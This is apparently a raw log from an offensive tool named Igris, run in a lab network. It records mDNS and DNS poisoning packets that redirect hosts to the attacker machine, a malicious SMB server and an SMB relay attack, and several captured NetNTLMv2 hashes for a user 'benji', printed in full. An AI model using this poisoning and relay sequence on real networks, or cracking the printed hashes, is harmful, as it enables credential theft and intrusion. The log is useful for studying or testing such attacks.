2021-11-12 15:15:06.515 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:06.533 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-12 15:15:06.534 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:0522b3e50dc18cc239c6ede77d978845:01010000000000000079db12d8d7d701280d1591bf38c8de000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f007200440066004600070008000079db12d8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002e0063006900660073002f006100740061007100750065006500650065006500650065002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:06.550 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-12 15:15:06.550 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:0522b3e50dc18cc239c6ede77d978845:01010000000000000079db12d8d7d701280d1591bf38c8de000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f007200440066004600070008000079db12d8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002e0063006900660073002f006100740061007100750065006500650065006500650065002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:06.588 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:15:06.589 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:0522b3e50dc18cc239c6ede77d978845:01010000000000000079db12d8d7d701280d1591bf38c8de000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f007200440066004600070008000079db12d8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002e0063006900660073002f006100740061007100750065006500650065006500650065002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:11.554 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 15:29:37.638 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 15:29:37.661 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 15:29:37.672 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 15:29:37.696 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 15:29:37.698 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 15:29:37.723 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 15:29:37.724 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:29:37.733 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 15:29:37.738 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:29:37.739 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 15:29:37.740 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:31:40.681 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:31:40.681 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:31:40.681 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 169.254.7.232[0m
2021-11-13 15:31:40.708 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:31:40.709 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:31:40.709 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 15:31:43.246 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:31:43.246 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:31:43.246 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 15:31:43.288 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:31:43.289 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:31:52.746 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:31:52.746 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:31:52.746 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 15:31:52.781 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:31:52.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:31:52.782 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 15:35:21.204 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 15:38:29.458 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 15:38:29.459 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 15:38:29.464 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 15:38:29.472 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 15:38:29.473 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 15:38:29.478 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 15:38:29.478 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:29.479 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 15:38:29.480 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:29.481 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 15:38:29.482 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:34.939 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:34.940 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:34.940 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 15:38:34.977 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:34.977 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:34.978 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 15:38:35.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:35.027 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:35.029 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:35.030 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:35.939 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49808)
2021-11-13 15:38:35.940 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:36.042 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-13 15:38:36.042 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:36.043 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-13 15:38:36.043 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:36.044 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:fc0d84ce82391789bc2c284cf0cfcb2f:01010000000000000026b285a4d8d701ef5166f4114f52840000000001001000760077007300530048007900610050000300100076007700730053004800790061005000020010005a004800700047004900580078005800040010005a004800700047004900580078005800070008000026b285a4d8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
2021-11-13 15:38:36.044 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:36.084 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-13 15:38:36.084 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:fc0d84ce82391789bc2c284cf0cfcb2f:01010000000000000026b285a4d8d701ef5166f4114f52840000000001001000760077007300530048007900610050000300100076007700730053004800790061005000020010005a004800700047004900580078005800040010005a004800700047004900580078005800070008000026b285a4d8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000']
2021-11-13 15:38:36.101 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-13 15:38:36.102 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:fc0d84ce82391789bc2c284cf0cfcb2f:01010000000000000026b285a4d8d701ef5166f4114f52840000000001001000760077007300530048007900610050000300100076007700730053004800790061005000020010005a004800700047004900580078005800040010005a004800700047004900580078005800070008000026b285a4d8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000']
2021-11-13 15:38:36.139 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-13 15:38:36.139 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:fc0d84ce82391789bc2c284cf0cfcb2f:01010000000000000026b285a4d8d701ef5166f4114f52840000000001001000760077007300530048007900610050000300100076007700730053004800790061005000020010005a004800700047004900580078005800040010005a004800700047004900580078005800070008000026b285a4d8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000']
2021-11-13 15:38:45.356 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 15:38:54.130 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 15:38:54.130 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 15:38:54.134 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 15:38:54.141 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 15:38:54.141 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 15:38:54.149 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 15:38:54.150 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:54.156 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 15:38:54.157 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:54.157 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 15:38:54.158 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-13 15:38:57.407 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:57.408 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:57.408 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 15:38:57.446 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:57.446 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:57.447 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 15:38:57.486 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 15:38:57.486 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 15:38:57.489 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
